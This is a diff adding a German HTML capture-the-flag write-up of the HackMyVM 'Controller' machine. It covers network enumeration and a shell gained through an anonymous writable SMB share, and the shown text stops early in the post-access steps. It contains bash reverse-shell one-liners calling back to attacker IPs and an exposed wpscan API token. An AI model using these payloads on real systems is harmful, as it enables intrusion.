@@ -1,0 +1,759 @@
+﻿﻿﻿<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Controller - HackMyVM - Level: Hard - Bericht</title>
+    <link rel="stylesheet" href="style.css">
+	<link rel="stylesheet" href="../../horizontale-navbar.css">
+    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">
+</head>
+ <body>
+ 
+    <div class="header-bg">
+        <h1>Controller - HackMyVM - Level: Hard - Bericht</h1>
+        <div class="level-container">
+            <!-- Die Farbe (Rot) muss im CSS für diese Klasse definiert werden -->
+            <h2>Hard</h2>
+            <div class="circle">
+                <!-- Die Klassen steuern die Farbe (Rot) gemäß CSS -->
+                <div class="segment segment-1"></div>
+                <div class="segment segment-2"></div>
+                <div class="segment segment-3"></div>
+                <!-- Die Hintergrundfarbe wird durch CSS gesteuert -->
+                <div class="inner"></div>
+            </div>
+        </div>
+    </div>
+
+    <div class="container">
+        <section class="tools-used">
+            <h2>Verwendete Tools</h2>
+            <div class="tools-grid">
+                 <div class="tool-item">netdiscover (implied)</div>
+                 <div class="tool-item">arp-scan</div>
+                 <div class="tool-item">nmap</div>
+                 <div class="tool-item">vi</div>
+                 <div class="tool-item">gobuster</div>
+                 <div class="tool-item">enum4linux</div>
+                 <div class="tool-item">smbclient</div>
+                 <div class="tool-item">curl</div>
+                 <div class="tool-item">wpscan</div>
+                 <div class="tool-item">nikto</div>
+                 <div class="tool-item">python (payload)</div>
+                 <div class="tool-item">nc</div>
+                 <div class="tool-item">ls</div>
+                 <div class="tool-item">cat</div>
+                 <div class="tool-item">mkdir</div>
+                 <div class="tool-item">echo</div>
+                 <div class="tool-item">chmod</div>
+                 <div class="tool-item">ssh</div>
+                 <div class="tool-item">id</div>
+                 <div class="tool-item">python -c 'import pty...'</div>
+                 <div class="tool-item">find</div>
+                 <div class="tool-item">python http.server</div>
+                 <div class="tool-item">wget</div>
+                 <div class="tool-item">PwnKit (exploit)</div>
+            </div>
+        </section>
+
+        <section class="toc">
+            <h2>Inhaltsverzeichnis</h2>
+            <ul>
+                <li><a href="#reconnaissance">Reconnaissance</a></li>
+                <li><a href="#web-enumeration">Web Enumeration (WordPress & Samba)</a></li>
+                <li><a href="#initial-access">Initial Access (tester via SMB)</a></li>
+                <li><a href="#privilege-escalation">Privilege Escalation (tester -> root via PwnKit)</a></li>
+                <li><a href="#flags">Flags</a></li>
+            </ul>
+        </section>
+
+        <section id="reconnaissance">
+            <h2>Reconnaissance</h2>
+            <p class="analysis"><strong>Analyse:</strong> Der erste Schritt besteht darin, das Zielsystem im lokalen Netzwerk zu identifizieren. Die Ausgabe eines (nicht gezeigten) `netdiscover`-Scans und ein anschließender `arp-scan` werden verwendet.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <!-- netdiscover Output (impliziert) -->
+                    <pre>
+Currently scanning: Finished!   |   Screen View: Unique Hosts
+
+ 7 Captured ARP Req/Rep packets, from 5 hosts.   Total size: 420
+ _____________________________________________________________________________
+   IP            At MAC Address     Count     Len  MAC Vendor / Hostname
+ -----------------------------------------------------------------------------
+ 192.168.2.1     c4:86:e9:a5:6d:18      3     180  HUAWEI TECHNOLOGIES CO.,LTD
+ 192.168.2.102   ac:6f:bb:62:87:79      1      60  TATUNG Technology Inc.
+ 192.168.2.104   84:25:19:2f:66:32      1      60  Samsung Electronics
+ <span class="command">192.168.2.149</span>   08:00:27:fb:27:5f      1      60  PCS Systemtechnik GmbH
+ 192.168.2.188   f0:2f:74:1a:68:c0      1      60  ASUSTek COMPUTER INC.
+                    </pre>
+                 </div>
+            </div>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">arp-scan -l</span></div>
+                    <pre>
+Interface: eth0, type: EN10MB, MAC: 08:00:27:09:b6:08, IPv4: 192.168.2.140
+Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)
+192.168.2.1	c4:86:e9:a5:6d:18	HUAWEI TECHNOLOGIES CO.,LTD
+192.168.2.102	ac:6f:bb:62:87:79	TATUNG Technology Inc.
+<span class="command">192.168.2.149</span>	08:00:27:fb:27:5f	PCS Systemtechnik GmbH
+192.168.2.104	84:25:19:2f:66:32	Samsung Electronics
+192.168.2.188	f0:2f:74:1a:68:c0	(Unknown)
+192.168.2.145	e0:aa:96:64:c9:94	Samsung Electronics Co.,Ltd
+                    </pre>
+                </div>
+            </div>
+            <p class="evaluation"><strong>Bewertung:</strong> Beide Scans identifizieren erfolgreich den Host <code>192.168.2.149</code> mit einer Oracle VirtualBox MAC-Adresse als das wahrscheinliche Ziel.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Einen detaillierten Portscan auf <code>192.168.2.149</code> durchführen.<br><strong>Empfehlung (Admin):</strong> Standard-Netzwerkscans. Sicherstellen, dass nur autorisierte Geräte im Netzwerk aktiv sind.</p>
+
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nmap -sS -sC -T5 -sV -A 192.168.2.149 -p-</span></div>
+                    <pre>
+Starting Nmap 7.92 ( https://nmap.org ) at 2022-10-14 22:24 CEST
+Nmap scan report for controller (192.168.2.149)
+Host is up (0.0017s latency).
+Not shown: 65520 closed tcp ports (reset)
+PORT      STATE SERVICE      VERSION
+<span class="command">22/tcp    open  ssh          OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)</span>
+| ssh-hostkey: ...
+<span class="command">80/tcp    open  http         Apache httpd 2.4.41</span>
+|_http-title: CONTROLLER – Otro sitio realizado con WordPress
+|_http-generator: WordPress 5.7.2
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+<span class="command">88/tcp    open  kerberos-sec Heimdal Kerberos (server time: 2022-10-14 20:24:18Z)</span>
+<span class="command">135/tcp   open  msrpc        Microsoft Windows RPC</span>
+<span class="command">139/tcp   open  netbios-ssn  Samba smbd 4.6.2</span>
+<span class="command">389/tcp   open  ldap         (Anonymous bind OK)</span>
+| ssl-cert: Subject: commonName=CONTROLLER.controller.local/organizationName=Samba Administration...
+<span class="command">443/tcp   open  ssl/http     Apache httpd 2.4.41</span>
+|_ssl-date: TLS randomness does not represent time
+|_http-title: CONTROLLER – Otro sitio realizado con WordPress
+|_http-generator: WordPress 5.7.2
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+| tls-alpn: ...
+| ssl-cert: Subject: organizationName=CONTROLLER/stateOrProvinceName=Some-State/countryName=AU... <!-- Self-signed Cert -->
+<span class="command">445/tcp   open  netbios-ssn  Samba smbd 4.6.2</span>
+<span class="command">464/tcp   open  kpasswd5?</span>
+<span class="command">636/tcp   open  ssl/ldap     (Anonymous bind OK)</span>
+| ssl-cert: Subject: commonName=CONTROLLER.controller.local/organizationName=Samba Administration...
+<span class="command">3268/tcp  open  ldap         (Anonymous bind OK)</span>
+| ssl-cert: Subject: commonName=CONTROLLER.controller.local/organizationName=Samba Administration...
+<span class="command">3269/tcp  open  ssl/ldap     (Anonymous bind OK)</span>
+| ssl-cert: Subject: commonName=CONTROLLER.controller.local/organizationName=Samba Administration...
+<span class="command">49152/tcp open  msrpc        Microsoft Windows RPC</span>
+<span class="command">49153/tcp open  msrpc        Microsoft Windows RPC</span>
+<span class="command">49154/tcp open  msrpc        Microsoft Windows RPC</span>
+MAC Address: 08:00:27:FB:27:5F (Oracle VirtualBox virtual NIC)
+Aggressive OS guesses: Linux 2.6.32 (92%)...
+Service Info: Host: 127.0.0.1; OSs: Linux, Windows; CPE: cpe:/o:linux:linux_kernel, cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-time: ...
+|_nbstat: NetBIOS name: CONTROLLER, NetBIOS user: <unknown>, NetBIOS MAC: 80:bd:00:4a:08:7f (unknown)
+| smb2-security-mode:
+|   3.1.1:
+|_    <span class="password">Message signing enabled and required</span>
+|_clock-skew: 2s
+                    </pre>
+                </div>
+            </div>
+            <!-- Nmap filtered output for clarity -->
+            <div class="code-block">
+                <div class="terminal">
+                    <!-- Kein Prompt, gefilterte Nmap-Ausgabe aus dem Originaltext -->
+                    <pre>
+PORT      STATE    SERVICE
+<span class="command">22/tcp    open     ssh</span>
+<span class="command">80/tcp    filtered http</span> <!-- Hinweis: Status geändert zu filtered in der Zusammenfassung -->
+<span class="command">88/tcp    open     kerberos-sec</span>
+<span class="command">135/tcp   open     msrpc</span>
+<span class="command">139/tcp   open     netbios-ssn</span>
+<span class="command">389/tcp   open     ldap</span>
+<span class="command">443/tcp   open     https</span>
+<span class="command">445/tcp   open     microsoft-ds</span>
+<span class="command">464/tcp   open     kpasswd5</span>
+<span class="command">636/tcp   open     ldapssl</span>
+<span class="command">3268/tcp  open     globalcatLDAP</span>
+<span class="command">3269/tcp  open     globalcatLDAPssl</span>
+<span class="command">49152/tcp open     unknown</span>
+<span class="command">49153/tcp open     unknown</span>
+<span class="command">49154/tcp open     unknown</span>
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Ein umfassender Nmap-Scan identifiziert eine ungewöhnliche Mischung aus Diensten auf einem Linux-System (Ubuntu mit OpenSSH 8.2p1, Apache 2.4.41 mit WordPress 5.7.2):
+                <ul>
+                    <li>Standard Linux/Web: SSH (22), HTTP (80 - später als 'filtered' markiert?), HTTPS (443).</li>
+                    <li>Active Directory / Samba DC Dienste: Kerberos (88), RPC (135, dynamische Ports), NetBIOS (139, 445), LDAP (389, 3268), LDAPS (636, 3269), Kpasswd (464).</li>
+                </ul>
+                Wichtige Details:
+                <ul>
+                    <li>WordPress 5.7.2 läuft auf Apache.</li>
+                    <li>LDAP erlaubt anonyme Anfragen (Anonymous bind OK).</li>
+                    <li>Samba 4.6.2 wird verwendet.</li>
+                    <li>SMB Message Signing ist aktiviert und erforderlich.</li>
+                    <li>Der Hostname scheint CONTROLLER zu sein, in einer Domäne `controller.local` (aus LDAP-Zertifikat).</li>
+                    <li>Die gefilterte Zusammenfassung listet Port 80 als 'filtered', was im Widerspruch zur Hauptausgabe steht ('open'). Dies könnte auf Firewall-Regeln oder Scan-Inkonsistenzen hindeuten.</li>
+                </ul>
+            </p>
+            <p class="evaluation"><strong>Bewertung:</strong> Das System ist ein Linux-Server, der als Samba Active Directory Domain Controller konfiguriert ist und gleichzeitig einen WordPress-Webserver betreibt. Dies ist eine komplexe Konfiguration mit mehreren potenziellen Angriffsvektoren: WordPress-Schwachstellen, anonyme LDAP-Enumeration, SMB-Enumeration, Kerberos-Angriffe. Die SMB-Signierung erschwert einige Relay-Angriffe. Die Diskrepanz beim Port 80 Status benötigt Klärung.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong>
+                1. Den Webserver (Port 80/443) mit WordPress-spezifischen Scannern (z.B. `wpscan`) untersuchen.
+                2. Anonyme LDAP-Abfragen (Port 389) durchführen, um Benutzer, Gruppen und Domäneninformationen zu sammeln.
+                3. SMB (Port 445) mit Tools wie `enum4linux` oder `nxc` auf Shares und Benutzerinformationen prüfen (anonym und später authentifiziert).
+                4. Den Status von Port 80 erneut prüfen.<br>
+            <strong>Empfehlung (Admin):</strong> Die Kombination von DC-Rolle und Webserver auf demselben System ist sicherheitstechnisch nicht ideal und erhöht die Angriffsfläche. Anonyme LDAP-Bindungen deaktivieren. SMB-Signierung beibehalten. Alle Dienste (Samba, Apache, WordPress, OS) aktuell halten.</p>
+
+            <p class="analysis"><strong>Analyse (Notiz):</strong> Eine im Text gefundene Python-Codezeile für eine Reverse Shell. Es ist unklar, woher sie stammt oder ob sie hier relevant ist.</p>
+            <div class="code-block">
+                <div class="terminal">
+                     <!-- Notiz aus dem Originaltext -->
+                    <pre>
+import commands
+commands.getoutput('/bin/bash -c "/bin/bash -i >& /dev/tcp/192.168.2.131/4444 0>&1"')
+                    </pre>
+                 </div>
+            </div>
+            <p class="evaluation"><strong>Bewertung:</strong> Wahrscheinlich eine Notiz oder ein Überbleibsel aus einem anderen Kontext. Die IP `192.168.2.131` taucht sonst nicht auf.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Vorerst ignorieren, es sei denn, es ergibt sich später ein Kontext.<br><strong>Empfehlung (Admin):</strong> Nicht relevant.</p>
+        </section>
+
+        <section id="web-enumeration">
+             <h2>Web Enumeration (WordPress & Samba)</h2>
+
+             <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">gobuster dir -u http://192.168.2.149 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -e -x .git,[...] -t 100 -e -s "200,204,301,302,307,401"</span></div>
+                    <pre>
+[...]
+<span class="command">http://192.168.2.149/index.html</span>           (Status: 200) [Size: 10918]
+<span class="command">http://192.168.2.149/wp-content</span>           (Status: 301) [Size: 319] [--> http://192.168.2.149/wp-content/]
+<span class="command">http://192.168.2.149/index.php</span>            (Status: 301) [Size: 0] [--> http://192.168.2.149/]
+<span class="command">http://192.168.2.149/license.txt</span>          (Status: 200) [Size: 19915]
+<span class="command">http://192.168.2.149/wp-includes</span>          (Status: 301) [Size: 320] [--> http://192.168.2.149/wp-includes/]
+<span class="command">http://192.168.2.149/wp-login.php</span>         (Status: 200) [Size: 8305]
+<span class="command">http://192.168.2.149/readme.html</span>          (Status: 200) [Size: 7345]
+<span class="command">http://192.168.2.149/wp-trackback.php</span>     (Status: 200) [Size: 136]
+<span class="command">http://192.168.2.149/wp-admin</span>             (Status: 301) [Size: 317] [--> http://192.168.2.149/wp-admin/]
+<span class="command">http://192.168.2.149/xmlrpc.php</span>           (Status: 405) [Size: 42]
+                    </pre>
+                 </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Gobuster wird verwendet, um Verzeichnisse und Dateien auf dem Webserver zu finden. Es identifiziert typische WordPress-Pfade und Dateien wie `/wp-content`, `/wp-includes`, `/wp-admin`, `wp-login.php`, `xmlrpc.php`, `license.txt`, `readme.html`.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Bestätigt die WordPress-Installation und liefert Standardpfade. Keine ungewöhnlichen oder direkt ausnutzbaren Dateien gefunden.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> `wpscan` verwenden, um nach spezifischen WordPress-Schwachstellen (Version, Plugins, Themes, Benutzer) zu suchen. `xmlrpc.php` auf Brute-Force-Anfälligkeit prüfen.<br><strong>Empfehlung (Admin):</strong> WordPress und alle Komponenten aktuell halten. `xmlrpc.php` deaktivieren, wenn nicht benötigt.</p>
+
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">enum4linux -a 192.168.2.149</span></div>
+                    <pre>
+=========================================( Target Information )=========================================
+[...]
+user:[<span class="command">Administrator</span>] rid:[0x1f4]
+user:[<span class="command">Guest</span>] rid:[0x1f5]
+user:[<span class="command">krbtgt</span>] rid:[0x1f6]
+
+	Sharename       Type      Comment
+	---------       ----      -------
+	<span class="command">sysvol</span>          Disk
+	<span class="command">netlogon</span>        Disk
+	<span class="command">tester</span>          Disk      <!-- Interessanter Share -->
+	<span class="command">IPC$</span>            IPC       IPC Service (Samba 4.11.6-Ubuntu)
+
+[...]
+[E] Can't understand response: NT_STATUS_OBJECT_NAME_NOT_FOUND listing \* //192.168.2.149/IPC$
+[...]
+[+] Found domain(s):
+
+	[+] CONTROL
+	[+] BUILTIN
+[...]
+[E] Couldn't get SID: NT_STATUS_ACCESS_DENIED.  RID cycling not possible.
+[...]
+                    </pre>
+                 </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> `enum4linux` wird verwendet, um Informationen über SMB und NetBIOS zu sammeln. Es findet Standardbenutzer (Administrator, Guest, krbtgt), Standard-Shares (`sysvol`, `netlogon`, `IPC$`) sowie einen benutzerdefinierten Share namens `tester`. Es identifiziert die Domäne `CONTROL`. RID-Cycling zum Enumerieren weiterer Benutzer scheitert wegen fehlender Berechtigungen.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Bestätigt die Samba/AD-Konfiguration. Der Share `tester` ist besonders interessant, da er nicht standardmäßig ist. Das Scheitern des RID-Cyclings ist normal bei Standardkonfigurationen.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Versuchen, sich anonym mit dem `tester`-Share zu verbinden und dessen Inhalt zu untersuchen.<br><strong>Empfehlung (Admin):</strong> Anonymen Zugriff auf Shares einschränken. Unnötige Shares entfernen.</p>
+
+              <div class="code-block">
+                <div class="terminal">
+                    <!-- Prompt unklar im Original -->
+                    <div class="prompt">┌──(root㉿Darkspirit)-[~]
+└─# <span class="command">smbclient //192.168.2.149/tester -U %</span></div>
+                     <!-- Keine explizite Ausgabe des Erfolgs im Original, wird aber im nächsten Schritt impliziert -->
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Es wird versucht, sich mit `smbclient` anonym (<code>-U %</code>) mit dem zuvor entdeckten Share `tester` zu verbinden.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Der Erfolg dieser Verbindung wird im nächsten Schritt (Upload) bestätigt. Dies ist eine **kritische Schwachstelle**, da ein anonymer Benutzer auf einen Share zugreifen kann.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Den Inhalt des Shares auflisten und prüfen, ob Dateien hochgeladen werden können.<br><strong>Empfehlung (Admin):</strong> Anonymen Zugriff auf alle SMB-Shares deaktivieren.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                      <!-- Manuelle Notiz/URL -->
+                    <pre>http://controller.hmv/wp-login.php</pre>
+                 </div>
+             </div>
+              <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">curl http://controller.hmv/ -I</span></div>
+                    <pre>
+HTTP/1.1 200 OK
+Date: Fri, 14 Oct 2022 20:37:20 GMT
+Server: Apache/2.4.41 (Ubuntu)
+Strict-Transport-Security: max-age=63072000; includeSubdomains
+X-Frame-Options: DENY
+X-Content-Type-Options: nosniff
+Link: <http://<span class="password">192.168.0.25</span>/index.php/wp-json/>; rel="https://api.w.org/"
+Content-Type: text/html; charset=UTF-8
+                    </pre>
+                 </div>
+             </div>
+              <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">curl http://controller.hmv/wp-admin/ -I</span></div>
+                    <pre>
+HTTP/1.1 302 Found
+Date: Fri, 14 Oct 2022 20:39:48 GMT
+Server: Apache/2.4.41 (Ubuntu)
+[...]
+Location: http://<span class="password">192.168.0.25</span>/wp-login.php?redirect_to=http%3A%2F%2Fcontroller.hmv%2Fwp-admin%2F&reauth=1
+Content-Type: text/html; charset=UTF-8
+                    </pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Es werden HEAD-Anfragen (`curl -I`) an die WordPress-Startseite und den Admin-Bereich gesendet. Auffällig ist, dass die Header (`Link`, `Location`) eine interne IP-Adresse (`192.168.0.25`) preisgeben, die vom gescannten Netzwerksegment (`192.168.2.x`) abweicht.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Dies deutet auf eine mögliche Fehlkonfiguration von WordPress oder des Reverse Proxys hin (Information Leakage). Die IP `192.168.0.25` könnte ein internes Backend oder ein anderer Server sein.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Diese IP notieren. Prüfen, ob sie aus dem aktuellen Netzwerk erreichbar ist. Die WordPress-Konfiguration (Site URL, Home URL) genauer untersuchen.<br><strong>Empfehlung (Admin):</strong> Die WordPress-URL-Einstellungen (`WP_HOME`, `WP_SITEURL` in `wp-config.php` oder in den DB-Optionen) überprüfen und sicherstellen, dass sie auf die öffentliche URL/IP verweisen, um das Leaken interner Adressen zu verhindern.</p>
+
+             <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">wpscan --url http://controller.hmv/wp-login.php -e u --api-token RoBoAaM72LLsihOlqUJrA1EleT6AJAd9QxQ9rbmQNCY</span></div>
+                    <pre>
+[...]
+Interesting Finding(s):
+[+] Headers
+ | Interesting Entry: Server: Apache/2.4.41 (Ubuntu)
+[+] WordPress readme found: http://controller.hmv/wp-login.php/readme.html
+[+] This site seems to be a multisite
+[+] The external WP-Cron seems to be enabled: http://controller.hmv/wp-login.php/wp-cron.php
+[...]
+[i] The WordPress version could not be detected.
+[i] The main theme could not be detected.
+[+] Enumerating Users (via Passive and Aggressive Methods)
+ Brute Forcing Author IDs - Time: 00:00:00 <========================================> (10 / 10) 100.00% Time: 00:00:00
+<span class="password">[i] No Users Found.</span>
+[...]
+                    </pre>
+                 </div>
+             </div>
+            <p class="analysis"><strong>Analyse:</strong> `wpscan` wird zur Enumeration von Benutzern (`-e u`) auf der WordPress-Seite verwendet. Es findet Standardinformationen (Multisite, readme, wp-cron), kann aber die Version nicht genau bestimmen und findet keine Benutzer über die Standardmethoden (Author-ID-Scan).</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Scan liefert keine direkten Benutzernamen oder verwertbaren Schwachstellen. Das Scheitern der Benutzerenumeration könnte auf Sicherheitsmaßnahmen oder eine ungewöhnliche Konfiguration zurückzuführen sein.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Andere Methoden zur Benutzerfindung (LDAP, SMB) weiterverfolgen. Manuell nach Hinweisen in Kommentaren oder Beiträgen suchen.<br><strong>Empfehlung (Admin):</strong> Benutzerenumeration in WordPress erschweren (z.B. durch Plugins oder Konfiguration).</p>
+
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nikto -h http://192.168.2.149</span></div>
+                    <pre>
+[...]
++ Server: Apache/2.4.41 (Ubuntu)
++ RFC-1918 IP address found in the 'link' header. The IP is "<span class="password">192.168.0.25</span>".
++ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
++ Uncommon header 'link' found, with contents: <http://192.168.0.25/index.php/wp-json/>; rel="https://api.w.org/"
++ Uncommon header 'x-redirect-by' found, with contents: WordPress
+[...]
++ /wp-content/plugins/akismet/readme.txt: The WordPress Akismet plugin 'Tested up to' version usually matches the WordPress version
++ /wp-links-opml.php: This WordPress script reveals the installed version.
++ OSVDB-3092: /license.txt: License file found may identify site software.
++ /: A Wordpress installation was found.
++ Cookie wordpress_test_cookie created without the httponly flag
++ <span class="password">OSVDB-3268: /wp-content/uploads/: Directory indexing found.</span>
++ <span class="password">/wp-content/uploads/: Wordpress uploads directory is browsable. This may reveal sensitive information</span>
+[...]
+                    </pre>
+                 </div>
+            </div>
+            <div class="code-block">
+                 <div class="terminal">
+                     <!-- Manuelle Notiz -->
+                    <pre>http://controller.hmv//wp-content/uploads/</pre>
+                 </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Ein erneuter Nikto-Scan bestätigt frühere Funde und hebt hervor:
+                <ul>
+                    <li>Erneute Sichtbarkeit der internen IP `192.168.0.25`.</li>
+                    <li>Fehlender `X-XSS-Protection`-Header.</li>
+                    <li>Fehlendes `HttpOnly`-Flag für den `wordpress_test_cookie`.</li>
+                    <li>**Wichtig:** Das Verzeichnis `/wp-content/uploads/` ist browsbar (Directory Indexing).</li>
+                </ul>
+            </p>
+            <p class="evaluation"><strong>Bewertung:</strong> Das browsbare Upload-Verzeichnis ist ein potenzielles Informationsleck. Fehlende Cookie-Flags und Header erhöhen das Risiko bei anderen Schwachstellen (z.B. XSS). Die interne IP bleibt ein interessanter Punkt.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Das Verzeichnis `/wp-content/uploads/` manuell untersuchen. Nach interessanten oder versehentlich hochgeladenen Dateien suchen.<br><strong>Empfehlung (Admin):</strong> Directory Indexing für das Uploads-Verzeichnis deaktivieren. HttpOnly-Flag für Cookies setzen. Interne IP-Leaks beheben.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">curl -I http://controller.hmv/index.php/2021/06/27/hola-mundo/</span></div>
+                    <pre>
+HTTP/1.1 200 OK
+Date: Fri, 14 Oct 2022 20:50:43 GMT
+Server: Apache/2.4.41 (Ubuntu)
+[...]
+X-Pingback: http://<span class="password">192.168.0.25</span>/xmlrpc.php
+Link: <http://<span class="password">192.168.0.25</span>/index.php/wp-json/>; rel="https://api.w.org/"
+Link: <http://<span class="password">192.168.0.25</span>/index.php/wp-json/wp/v2/posts/1>; rel="alternate"; type="application/json"
+Link: <http://<span class="password">192.168.0.25</span>/?p=1>; rel=shortlink
+Content-Type: text/html; charset=UTF-8
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Eine HEAD-Anfrage an einen Beispiel-WordPress-Beitrag ("hola-mundo") zeigt erneut die interne IP `192.168.0.25` in verschiedenen Link- und Pingback-Headern.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Bestätigt das konsistente Leaking der internen IP durch WordPress.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Siehe vorherige Empfehlung zum IP-Leak.<br><strong>Empfehlung (Admin):</strong> WordPress-URL-Einstellungen korrigieren.</p>
+        </section>
+
+        <section id="initial-access">
+            <h2>Initial Access (tester via SMB)</h2>
+            <p class="analysis"><strong>Analyse:</strong> Basierend auf dem Fund des anonym zugänglichen SMB-Shares `tester` wird nun versucht, eine Reverse Shell darüber zu erlangen. Es wird eine Python-Payload erstellt, die eine Bash-Reverse-Shell zur Angreifer-IP (`192.168.2.140`) auf Port `5555` aufbaut.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">vi test.txt</span></div>
+                    <pre>
+import commands
+commands.getoutput('/bin/bash -c "/bin/bash -i >& /dev/tcp/192.168.2.140/5555 0>&1"')
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Eine Datei `test.txt` wird mit einem Python-Einzeiler erstellt. Dieser nutzt das veraltete `commands`-Modul (Python 2), um eine interaktive Bash-Reverse-Shell zu starten.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die Payload ist vorbereitet, um auf das Zielsystem hochgeladen zu werden.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Die Datei `test.txt` auf den `tester`-Share hochladen.<br><strong>Empfehlung (Admin):</strong> Veraltete Python-Versionen/Module vermeiden.</p>
+
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">smbclient \\\\192.168.2.149\\tester</span></div> <!-- Korrektur: IP statt $ip -->
+                    <pre>
+Password for [WORKGROUP\root]: <!-- Enter gedrückt für anonym -->
+<span class="password">Anonymous login successful</span>
+Try "help" to get a list of possible commands.
+smb: \> ls
+  .                                   D        0  Sun Jun 27 19:38:00 2021
+  ..                                  D        0  Sun Jun 27 19:38:00 2021
+
+		20511312 blocks of size 1024. 10788732 blocks available
+smb: \> <span class="command">put test.txt</span>
+<span class="password">putting file test.txt as \test.txt (99,6 kb/s) (average 99,6 kb/s)</span>
+smb: \>
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Die Verbindung zum `tester`-Share via `smbclient` als anonymer Benutzer gelingt. Die vorbereitete Payload-Datei `test.txt` wird erfolgreich auf den Share hochgeladen.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der kritische Schritt. Die Payload ist nun auf dem Zielsystem in einem potenziell unsicheren Verzeichnis. Es wird angenommen, dass ein Mechanismus (Cronjob, Dienst, anderer Benutzer) diese Datei ausführt.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Einen Listener starten und auf die eingehende Reverse Shell warten.<br><strong>Empfehlung (Admin):</strong> Anonymen Schreibzugriff auf Shares verhindern. Verzeichnisse überwachen, in die geschrieben werden kann.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nc -lvnp 5555</span></div>
+                    <pre>
+listening on [any] 5555 ...
+
+:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
+                 Automatisch nach 10 sekunden connection...
+:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
+
+connect to [192.168.2.140] from (UNKNOWN) [192.168.2.149] 41556
+bash: cannot set terminal process group (68120): Inappropriate ioctl for device
+bash: no job control in this shell
+<span class="prompt">tester@controller:~$</span>
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Ein Netcat-Listener wird auf Port 5555 gestartet. Nach kurzer Zeit kommt eine Verbindung vom Zielsystem (`192.168.2.149`) herein. Der Prompt `tester@controller:~$` zeigt, dass die Shell als Benutzer `tester` läuft.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Erfolg! Der Upload der Python-Payload auf den anonymen SMB-Share führte zur Ausführung des Codes und somit zum initialen Zugriff als Benutzer `tester`. Der Mechanismus, der die Ausführung auslöst, bleibt unklar, aber das Ergebnis ist erreicht.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Die Shell stabilisieren, die Umgebung als `tester` untersuchen und den User-Flag suchen.<br><strong>Empfehlung (Admin):</strong> Den Mechanismus finden und beheben, der die Ausführung von Dateien aus dem `tester`-Share ermöglicht. Den Share absichern.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">tester@controller:~$ <span class="command">ls /home</span></div>
+                    <pre>
+ls /home
+<span class="command">server</span>
